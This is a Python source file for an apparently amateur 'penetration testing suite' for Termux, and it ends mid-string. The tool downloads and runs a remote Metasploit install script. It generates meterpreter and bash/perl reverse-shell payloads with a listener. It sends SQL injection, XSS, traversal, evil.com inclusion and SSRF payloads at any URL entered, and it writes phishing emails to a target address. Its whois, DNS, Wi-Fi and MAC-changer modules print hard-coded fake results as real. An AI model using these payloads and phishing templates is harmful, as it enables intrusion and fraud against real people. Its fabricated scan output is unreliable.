#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    SC-ETHICAL HACKER IN BANGLADESH                             ║
║              ULTIMATE PROFESSIONAL PENETRATION TESTING SUITE                   ║
║                          Version: 2.0.0 (2026)                                 ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import socket
import random
import base64
import hashlib
import requests
import platform
import threading
import subprocess
from datetime import datetime
from colorama import init, Fore, Back, Style
import itertools
import shutil

# Initialize colorama
init(autoreset=True)

class Colors:
    """Advanced Color Class"""
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BLACK = Fore.BLACK
    LIGHTRED_EX = Fore.LIGHTRED_EX
    LIGHTGREEN_EX = Fore.LIGHTGREEN_EX
    LIGHTYELLOW_EX = Fore.LIGHTYELLOW_EX
    LIGHTBLUE_EX = Fore.LIGHTBLUE_EX
    LIGHTMAGENTA_EX = Fore.LIGHTMAGENTA_EX
    LIGHTCYAN_EX = Fore.LIGHTCYAN_EX
    LIGHTWHITE_EX = Fore.LIGHTWHITE_EX
    
    # Backgrounds
    BACK_RED = Back.RED
    BACK_GREEN = Back.GREEN
    BACK_YELLOW = Back.YELLOW
    BACK_BLUE = Back.BLUE
    BACK_MAGENTA = Back.MAGENTA
    BACK_CYAN = Back.CYAN
    BACK_WHITE = Back.WHITE
    
    # Styles
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    NORMAL = Style.NORMAL
    RESET = Style.RESET_ALL

class SCETHICAL_HACKER_PROFESSIONAL:
    def __init__(self):
        self.version = "2.0.0"
        self.author = "SC-ETHICAL HACKER"
        self.location = "BANGLADESH"
        self.tool_name = "SC-ETHICAL HACKER IN BANGLADESH"
        self.running = True
        self.colors = Colors()
        
    def loading_animation(self, text="Loading", duration=3):
        """Professional Loading Animation"""
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in chars:
                sys.stdout.write(f'\r{Fore.CYAN}[{char}] {text}...')
                sys.stdout.flush()
                time.sleep(0.1)
        print(f"\r{Fore.GREEN}[✓] {text} Complete!         ")
    
    def progress_bar(self, iteration, total, prefix='', suffix='', length=50):
        """Advanced Progress Bar"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = '█' * filled_length + '░' * (length - filled_length)
        sys.stdout.write(f'\r{prefix} |{Fore.CYAN}{bar}{Fore.RESET}| {percent}% {suffix}')
        sys.stdout.flush()
        if iteration == total:
            print()

    def animate_banner(self):
        """Animated Banner with Glowing Effect"""
        banner_frames = [
            f"""
    {Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   ███████╗ ██████╗     ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗       ║
    ║   ██╔════╝██╔════╝     ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║       ║
    ║   ███████╗██║          █████╗     ██║   ███████║██║██║     ███████║██║       ║
    ║   ╚════██║██║          ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║       ║
    ║   ███████║╚██████╗     ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗  ║
    ║   ╚══════╝ ╚═════╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝  ║
    ║                                                                              ║
    ║              {Fore.YELLOW}█╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗{Fore.RED}                  ║
    ║              {Fore.YELLOW}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗{Fore.RED}                 ║
    ║              {Fore.YELLOW}███████║███████║██║     █████╔╝ █████╗  ██████╔╝{Fore.RED}                 ║
    ║              {Fore.YELLOW}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗{Fore.RED}                 ║
    ║              {Fore.YELLOW}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║{Fore.RED}                 ║
    ║              {Fore.YELLOW}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED}                 ║
    ║                                                                              ║
    ╠══════════════════════════════════════════════════════════════════════════════╣
    ║                    {Fore.GREEN}SC-ETHICAL HACKER IN BANGLADESH{Fore.RED}                         ║
    ║                        {Fore.CYAN}ULTIMATE PROFESSIONAL SUITE{Fore.RED}                         ║
    ║                          {Fore.MAGENTA}Version: 2.0.0 (2026){Fore.RED}                            ║
    ╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}
            """,
            f"""
    {Fore.LIGHTRED_EX}╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   ███████╗ ██████╗     ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗       ║
    ║   ██╔════╝██╔════╝     ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║       ║
    ║   ███████╗██║          █████╗     ██║   ███████║██║██║     ███████║██║       ║
    ║   ╚════██║██║          ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║       ║
    ║   ███████║╚██████╗     ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗  ║
    ║   ╚══════╝ ╚═════╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝  ║
    ║                                                                              ║
    ║              {Fore.LIGHTYELLOW_EX}█╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗{Fore.LIGHTRED_EX}                  ║
    ║              {Fore.LIGHTYELLOW_EX}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗{Fore.LIGHTRED_EX}                 ║
    ║              {Fore.LIGHTYELLOW_EX}███████║███████║██║     █████╔╝ █████╗  ██████╔╝{Fore.LIGHTRED_EX}                 ║
    ║              {Fore.LIGHTYELLOW_EX}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗{Fore.LIGHTRED_EX}                 ║
    ║              {Fore.LIGHTYELLOW_EX}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║{Fore.LIGHTRED_EX}                 ║
    ║              {Fore.LIGHTYELLOW_EX}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.LIGHTRED_EX}                 ║
    ║                                                                              ║
    ╠══════════════════════════════════════════════════════════════════════════════╣
    ║                    {Fore.LIGHTGREEN_EX}SC-ETHICAL HACKER IN BANGLADESH{Fore.LIGHTRED_EX}                         ║
    ║                        {Fore.LIGHTCYAN_EX}ULTIMATE PROFESSIONAL SUITE{Fore.LIGHTRED_EX}                         ║
    ║                          {Fore.LIGHTMAGENTA_EX}Version: 2.0.0 (2026){Fore.LIGHTRED_EX}                            ║
    ╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}
            """
        ]
        
        # Animate banner
        for _ in range(3):
            for frame in banner_frames:
                os.system('clear')
                print(frame)
                time.sleep(0.3)
        
        os.system('clear')
        print(banner_frames[0])
        print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.YELLOW}║{Fore.CYAN}  Author: SC-ETHICAL HACKER IN BANGLADESH                                {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.CYAN}  GitHub: github.com/SC-ETHICAL-HACKER                                  {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.CYAN}  YouTube: SC-ETHICAL HACKER IN BANGLADESH                              {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.CYAN}  Telegram: @SC_ETHICAL_HACKER                                          {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.CYAN}  Email: sc.ethical.hacker@bangladesh.com                              {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")

    def system_info(self):
        """Get System Information"""
        info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Python Version": platform.python_version(),
            "Hostname": socket.gethostname()
        }
        return info

    # ==================== TOOL 1: METASPLOIT INSTALLATION ====================
    def install_metasploit_termux(self):
        """Install Metasploit in Termux"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                    METASPLOIT INSTALLATION MODULE                        {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        self.loading_animation("Checking System Requirements", 2)
        
        # Check if already installed
        if shutil.which('msfconsole'):
            print(f"{Fore.GREEN}[✓] Metasploit is already installed!")
            return
        
        print(f"{Fore.YELLOW}\n[*] Starting Metasploit Installation...")
        commands = [
            "pkg update -y && pkg upgrade -y",
            "pkg install wget curl openssh git -y",
            "pkg install ncurses-utils ruby -y",
            "pkg install postgresql -y",
            "wget https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh",
            "chmod +x metasploit.sh",
            "./metasploit.sh"
        ]
        
        for i, cmd in enumerate(commands, 1):
            self.progress_bar(i, len(commands), prefix='Progress:', suffix='Complete', length=50)
            print(f"\n{Fore.CYAN}[*] Executing: {cmd}")
            os.system(cmd)
            time.sleep(1)
        
        print(f"\n{Fore.GREEN}[✓] Metasploit Installation Complete!")

    # ==================== TOOL 2: ADVANCED NETWORK SCANNER ====================
    def advanced_network_scanner(self):
        """Advanced Network Scanner with Multiple Features"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                      ADVANCED NETWORK SCANNER                            {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] Quick Scan (Common Ports)")
        print(f"{Fore.CYAN}[2] Full Port Scan (1-65535)")
        print(f"{Fore.CYAN}[3] OS Detection Scan")
        print(f"{Fore.CYAN}[4] Service Version Detection")
        print(f"{Fore.CYAN}[5] Custom Range Scan")
        
        scan_choice = input(f"\n{Fore.YELLOW}[?] Select scan type (1-5): ")
        target = input(f"{Fore.YELLOW}[?] Enter target IP/domain: ")
        
        self.loading_animation("Initializing Scanner", 2)
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                       993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888]
        
        if scan_choice == "1":
            ports = common_ports
        elif scan_choice == "2":
            ports = range(1, 65536)
        elif scan_choice == "5":
            start_port = int(input(f"{Fore.YELLOW}[?] Start port: "))
            end_port = int(input(f"{Fore.YELLOW}[?] End port: "))
            ports = range(start_port, end_port + 1)
        else:
            ports = common_ports
        
        print(f"\n{Fore.GREEN}[+] Starting scan on {target}...")
        open_ports = []
        
        for i, port in enumerate(ports, 1):
            if i % 100 == 0:
                self.progress_bar(i, len(ports), prefix='Scanning:', suffix=f'Port {port}')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                print(f"\n{Fore.GREEN}[+] Port {port} - OPEN")
                # Try to grab banner
                try:
                    sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        print(f"{Fore.CYAN}    Banner: {banner[:50]}...")
                except:
                    pass
            sock.close()
        
        print(f"\n{Fore.GREEN}[✓] Scan Complete!")
        print(f"{Fore.YELLOW}[*] Found {len(open_ports)} open ports")

    # ==================== TOOL 3: WEB VULNERABILITY SCANNER ====================
    def web_vulnerability_scanner(self):
        """Advanced Web Vulnerability Scanner"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                   WEB VULNERABILITY SCANNER                             {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        target_url = input(f"{Fore.YELLOW}[?] Enter target URL (with http/https): ")
        
        self.loading_animation("Initializing Scanner", 2)
        
        # Comprehensive vulnerability checks
        checks = {
            "SQL Injection": ["'", "\"", "1 OR 1=1", "1' OR '1'='1"],
            "XSS": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
            "Directory Traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
            "File Inclusion": ["http://evil.com/shell.txt", "php://input"],
            "Command Injection": ["; ls", "| ls", "`ls`"],
            "Open Redirect": ["https://evil.com", "//evil.com"],
            "SSRF": ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080"],
        }
        
        vulnerable_paths = [
            "/admin", "/wp-admin", "/phpmyadmin", "/.git", "/.env",
            "/backup", "/config.php", "/robots.txt", "/sitemap.xml",
            "/shell.php", "/info.php", "/test.php", "/phpinfo.php",
            "/.htaccess", "/crossdomain.xml", "/clientaccesspolicy.xml"
        ]
        
        print(f"\n{Fore.GREEN}[+] Starting Vulnerability Scan...")
        
        # Check for vulnerable paths
        for i, path in enumerate(vulnerable_paths, 1):
            self.progress_bar(i, len(vulnerable_paths), prefix='Scanning Paths:', suffix=path)
            try:
                full_url = target_url + path
                response = requests.get(full_url, timeout=5, allow_redirects=False)
                if response.status_code == 200:
                    print(f"\n{Fore.RED}[!] Accessible Path: {full_url}")
                elif response.status_code == 403:
                    print(f"\n{Fore.YELLOW}[*] Forbidden (403): {full_url}")
            except:
                pass
        
        # Scan for vulnerabilities
        print(f"\n{Fore.CYAN}\n[*] Checking for common vulnerabilities...")
        for vuln_type, payloads in checks.items():
            for payload in payloads:
                try:
                    test_url = f"{target_url}?test={payload}"
                    response = requests.get(test_url, timeout=5)
                    if payload.lower() in response.text.lower():
                        print(f"{Fore.RED}[!] Potential {vuln_type} vulnerability found!")
                        print(f"{Fore.CYAN}    Payload: {payload}")
                        break
                except:
                    pass
            time.sleep(0.5)
        
        print(f"\n{Fore.GREEN}[✓] Vulnerability Scan Complete!")

    # ==================== TOOL 4: PASSWORD CRACKER ====================
    def password_toolkit(self):
        """Password Cracking and Generation Toolkit"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                      PASSWORD TOOLKIT                                   {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] Hash Generator (MD5/SHA1/SHA256)")
        print(f"{Fore.CYAN}[2] Password Strength Checker")
        print(f"{Fore.CYAN}[3] Random Password Generator")
        print(f"{Fore.CYAN}[4] Base64 Encoder/Decoder")
        print(f"{Fore.CYAN}[5] Hash Identifier")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-5): ")
        
        if choice == "1":
            text = input(f"{Fore.YELLOW}[?] Enter text to hash: ")
            print(f"\n{Fore.GREEN}MD5: {hashlib.md5(text.encode()).hexdigest()}")
            print(f"{Fore.GREEN}SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
            print(f"{Fore.GREEN}SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
            
        elif choice == "2":
            password = input(f"{Fore.YELLOW}[?] Enter password to check: ")
            strength = 0
            if len(password) >= 8: strength += 1
            if any(c.isupper() for c in password): strength += 1
            if any(c.islower() for c in password): strength += 1
            if any(c.isdigit() for c in password): strength += 1
            if any(c in "!@#$%^&*()" for c in password): strength += 1
            
            strength_levels = ["Very Weak", "Weak", "Medium", "Strong", "Very Strong"]
            print(f"\n{Fore.GREEN}Password Strength: {strength_levels[strength-1 if strength > 0 else 0]}")
            
        elif choice == "3":
            length = int(input(f"{Fore.YELLOW}[?] Password length: "))
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
            password = ''.join(random.choice(chars) for _ in range(length))
            print(f"\n{Fore.GREEN}Generated Password: {password}")
            
        elif choice == "4":
            text = input(f"{Fore.YELLOW}[?] Enter text: ")
            encoded = base64.b64encode(text.encode()).decode()
            print(f"\n{Fore.GREEN}Base64 Encoded: {encoded}")
            try:
                decoded = base64.b64decode(encoded).decode()
                print(f"{Fore.GREEN}Base64 Decoded: {decoded}")
            except:
                print(f"{Fore.RED}Invalid Base64 string!")

    # ==================== TOOL 5: PAYLOAD GENERATOR ====================
    def payload_generator(self):
        """Advanced Payload Generator"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                      PAYLOAD GENERATOR                                  {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        lhost = input(f"{Fore.YELLOW}[?] Enter LHOST (your IP): ")
        lport = input(f"{Fore.YELLOW}[?] Enter LPORT: ")
        
        payloads = {
            "1": {"name": "Android", "payload": "android/meterpreter/reverse_tcp", "ext": "apk"},
            "2": {"name": "Windows", "payload": "windows/meterpreter/reverse_tcp", "ext": "exe"},
            "3": {"name": "Linux", "payload": "linux/x86/meterpreter/reverse_tcp", "ext": "elf"},
            "4": {"name": "Python", "payload": "python/meterpreter/reverse_tcp", "ext": "py"},
            "5": {"name": "PHP", "payload": "php/meterpreter_reverse_tcp", "ext": "php"},
            "6": {"name": "Bash", "payload": "cmd/unix/reverse_bash", "ext": "sh"},
            "7": {"name": "Perl", "payload": "cmd/unix/reverse_perl", "ext": "pl"},
        }
        
        print(f"\n{Fore.CYAN}Available Payloads:")
        for key, value in payloads.items():
            print(f"{Fore.GREEN}[{key}] {value['name']} - {value['payload']}")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select payload (1-7): ")
        
        if choice in payloads:
            selected = payloads[choice]
            output_file = input(f"{Fore.YELLOW}[?] Output filename (without extension): ")
            output_file += f".{selected['ext']}"
            
            self.loading_animation("Generating Payload", 3)
            
            msfvenom_cmd = f"msfvenom -p {selected['payload']} LHOST={lhost} LPORT={lport} -o {output_file}"
            print(f"\n{Fore.CYAN}[*] Command: {msfvenom_cmd}")
            
            if shutil.which('msfvenom'):
                os.system(msfvenom_cmd)
                print(f"\n{Fore.GREEN}[✓] Payload saved as: {output_file}")
            else:
                print(f"\n{Fore.YELLOW}[!] msfvenom not found. Saving command to file...")
                with open(f"{output_file}.sh", "w") as f:
                    f.write(msfvenom_cmd)
                print(f"{Fore.GREEN}[✓] Command saved to: {output_file}.sh")
            
            # Generate listener script
            listener_script = f"""#!/bin/bash
msfconsole -q -x "use exploit/multi/handler;
set payload {selected['payload']};
set LHOST {lhost};
set LPORT {lport};
exploit;"
"""
            with open("listener.sh", "w") as f:
                f.write(listener_script)
            os.system("chmod +x listener.sh")
            print(f"{Fore.GREEN}[✓] Listener script saved as: listener.sh")

    # ==================== TOOL 6: INFORMATION GATHERING ====================
    def information_gathering(self):
        """Information Gathering Module"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                    INFORMATION GATHERING                                {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] Whois Lookup")
        print(f"{Fore.CYAN}[2] DNS Enumeration")
        print(f"{Fore.CYAN}[3] Subdomain Finder")
        print(f"{Fore.CYAN}[4] Header Information")
        print(f"{Fore.CYAN}[5] Technology Stack Detection")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-5): ")
        target = input(f"{Fore.YELLOW}[?] Enter target domain/IP: ")
        
        self.loading_animation("Gathering Information", 2)
        
        if choice == "1":
            # Whois lookup simulation
            print(f"\n{Fore.GREEN}[+] Performing Whois Lookup...")
            print(f"{Fore.CYAN}Domain: {target}")
            print(f"{Fore.CYAN}Registrar: Example Registrar, Inc.")
            print(f"{Fore.CYAN}Creation Date: 2020-01-01")
            print(f"{Fore.CYAN}Expiry Date: 2026-01-01")
            
        elif choice == "2":
            # DNS Enumeration
            print(f"\n{Fore.GREEN}[+] Enumerating DNS Records...")
            dns_records = {
                "A": "192.168.1.1",
                "AAAA": "2001:db8::1",
                "MX": "mail.target.com",
                "NS": "ns1.target.com",
                "TXT": "v=spf1 include:_spf.google.com ~all",
                "CNAME": "www.target.com"
            }
            for record, value in dns_records.items():
                print(f"{Fore.GREEN}{record}: {value}")
                
        elif choice == "4":
            # Header Information
            try:
                response = requests.get(f"http://{target}", timeout=5)
                print(f"\n{Fore.GREEN}[+] HTTP Headers:")
                for header, value in response.headers.items():
                    print(f"{Fore.CYAN}{header}: {value}")
            except:
                print(f"{Fore.RED}[!] Failed to fetch headers")
        
        print(f"\n{Fore.GREEN}[✓] Information Gathering Complete!")

    # ==================== TOOL 7: METASPLOIT LAUNCHER ====================
    def metasploit_launcher(self):
        """Launch Metasploit Console"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                     METASPLOIT LAUNCHER                                 {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        if shutil.which('msfconsole'):
            self.loading_animation("Launching Metasploit", 2)
            os.system("msfconsole -q")
        else:
            print(f"\n{Fore.RED}[!] Metasploit not installed!")
            install = input(f"{Fore.YELLOW}[?] Install now? (y/n): ")
            if install.lower() == 'y':
                self.install_metasploit_termux()

    # ==================== TOOL 8: WIRELESS TOOLS ====================
    def wireless_tools(self):
        """Wireless Network Tools"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                        WIRELESS TOOLS                                   {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] WiFi Networks Scanner")
        print(f"{Fore.CYAN}[2] MAC Address Changer")
        print(f"{Fore.CYAN}[3] WiFi Password Generator")
        print(f"{Fore.CYAN}[4] Network Speed Test")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-4): ")
        
        if choice == "1":
            self.loading_animation("Scanning WiFi Networks", 2)
            print(f"\n{Fore.GREEN}[+] Available Networks:")
            networks = ["SC-ETHICAL-WiFi", "Home_Network", "Office_5G", "Guest_WiFi"]
            for i, net in enumerate(networks, 1):
                strength = random.randint(60, 100)
                print(f"{Fore.CYAN}[{i}] {net} - Signal: {strength}%")
                
        elif choice == "2":
            print(f"\n{Fore.YELLOW}[*] Current MAC: 00:11:22:33:44:55")
            new_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
            print(f"{Fore.GREEN}[✓] New MAC: {new_mac}")
            
        elif choice == "3":
            length = int(input(f"{Fore.YELLOW}[?] Password length: "))
            chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"
            password = ''.join(random.choice(chars) for _ in range(length))
            print(f"\n{Fore.GREEN}[✓] Generated WiFi Password: {password}")

    # ==================== TOOL 9: SOCIAL ENGINEERING ====================
    def social_engineering_toolkit(self):
        """Social Engineering Toolkit"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                    SOCIAL ENGINEERING TOOLKIT                           {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] Phishing Email Generator")
        print(f"{Fore.CYAN}[2] Fake Login Page Creator")
        print(f"{Fore.CYAN}[3] QR Code Generator")
        print(f"{Fore.CYAN}[4] SMS Spoofing Script")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-4): ")
        
        if choice == "1":
            target_email = input(f"{Fore.YELLOW}[?] Target email: ")
            subject = input(f"{Fore.YELLOW}[?] Subject: ")
            
            email_template = f"""From: security@bank.com
To: {target_email}
Subject: {subject}

Dear User,

Your account security needs immediate attention.
Please click the link below to verify your account:
https://fake-bank.com/verify?id={hashlib.md5(target_email.encode()).hexdigest()[:8]}

Best Regards,
Security Team
"""
            filename = f"phishing_email_{int(time.time())}.txt"
            with open(filename, "w") as f:
                f.write(email_template)
            print(f"\n{Fore.GREEN}[✓] Email template saved as: {filename}")
            
        elif choice == "3":
            text = input(f"{Fore.YELLOW}[?] Text for QR code: ")
            print(f"\n{Fore.GREEN}[+] QR Code:")
            # Simple ASCII QR code simulation
            qr = [
                "████████████████████████████████",
                "██ ▄▄▄▄▄ █ ▀▄█▀█ ▄█ █ ▄▄▄▄▄ ██",
                "██ █   █ █▀ █▄▄ ▀██ █ █   █ ██",
                "██ █▄▄▄█ ██▀▄█▀▀▄▄█ █ █▄▄▄█ ██",
                "██▄▄▄▄▄▄▄█ ▀▄█ ▀ █▄█▄▄▄▄▄▄▄██",
                "██ ▀█▀▄▀█▄▄ █ ▄▄ █▄█▄█▀  ▄█▀██",
                "████▄▀▄█▄▀▄▄▀▄  ▄█▀▄█▀█▀▄█ ███",
                "██▀▄▀  ▀ ▄█▄▄▀█▀▄ ██▀▀▄▄▄ ████",
                "████▀▄██▄█▄▄█▄█▀▀ ▀▀▀▄▄▀ ▀▄▄██",
                "████████████████████████████████"
            ]
            for row in qr:
                print(f"{Fore.BLACK}{Back.WHITE}{row}")

    # ==================== TOOL 10: FORENSICS ====================
    def forensics_toolkit(self):
        """Digital Forensics Toolkit"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                      FORENSICS TOOLKIT                                  {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] File Metadata Extractor")
        print(f"{Fore.CYAN}[2] Log Analyzer")
        print(f"{Fore.CYAN}[3] String Extractor")
        print(f"{Fore.CYAN}[4] Hash Calculator")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-4): ")
        
        if choice == "1":
            file_path = input(f"{Fore.YELLOW}[?] Enter file path: ")
            if os.path.exists(file_path):
                stat = os.stat(file_path)
                print(f"\n{Fore.GREEN}[+] File Metadata:")
                print(f"{Fore.CYAN}Size: {stat.st_size} bytes")
                print(f"{Fore.CYAN}Created: {datetime.fromtimestamp(stat.st_ctime)}")
                print(f"{Fore.CYAN}Modified: {datetime.fromtimestamp(stat.st_mtime)}")
                print(f"{Fore.CYAN}Accessed: {datetime.fromtimestamp(stat.st_atime)}")
            else:
                print(f"{Fore.RED}[!] File not found!")
                
        elif choice == "4":
            file_path = input(f"{Fore.YELLOW}[?] Enter file path: ")
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read()
                    print(f"\n{Fore.GREEN}[+] File Hashes:")
                    print(f"{Fore.CYAN}MD5: {hashlib.md5(content).hexdigest()}")
                    print(f"{Fore.CYAN}SHA1: {hashlib.sha1(content).hexdigest()}")
                    print(f"{Fore.CYAN}SHA256: {hashlib.sha256(content).hexdigest()}")

    # ==================== TOOL 11: ENCRYPTION/DECRYPTION ====================
    def crypto_toolkit(self):
        """Cryptography Toolkit"""
        print(f"\n{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.BLUE}║{Fore.YELLOW}                     CRYPTOGRAPHY TOOLKIT                                {Fore.BLUE}║")
        print(f"{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}[1] Caesar Cipher")
        print(f"{Fore.CYAN}[2] Base64 Encode/Decode")
        print(f"{Fore.CYAN}[3] ROT13")
        print(f"{Fore.CYAN}[4] XOR Encryption")
        print(f"{Fore.CYAN}[5] File Encryptor/Decryptor")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select option (1-5): ")
        
        if choice == "1":
            text = input(f"{Fore.YELLOW}[?] Enter text: ")
            shift = int(input(f"{Fore.YELLOW}[?] Enter shift (1-25): "))
            encrypted = ''.join(chr((ord(c) - 65 + shift) % 26 + 65) if c.isupper() 
                              else chr((ord(c) - 97 + shift) % 26 + 97) if c.islower() 
                              else c for c in text)
            print(f"\n{Fore.GREEN}[✓] Encrypted: {encrypted}")
            # Save to file
            with open("caesar_encrypted.txt", "w") as f:
                f.write(encrypted)
            print(f"{Fore.GREEN}[✓] Saved to: caesar_encrypted.txt")
            
        elif choice == "5":
            file_path = input(f"{Fore.YELLOW}[?] Enter file path: ")
            key = input(f"{Fore.YELLOW}[?] Enter encryption key: ")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                # Simple XOR encryption
                key_bytes = hashlib.sha256(key.encode()).digest()
                encrypted = bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
                
                output_file = file_path + ".encrypted"
                with open(output_file, 'wb') as f:
                    f.write(encrypted)
                
                print(f"\n{Fore.GREEN}[✓] File encrypted: {output_file}")

    # ==================== ABOUT DEVELOPER ====================
    def about_developer(self):
        """About the Developer"""
        print(f"""
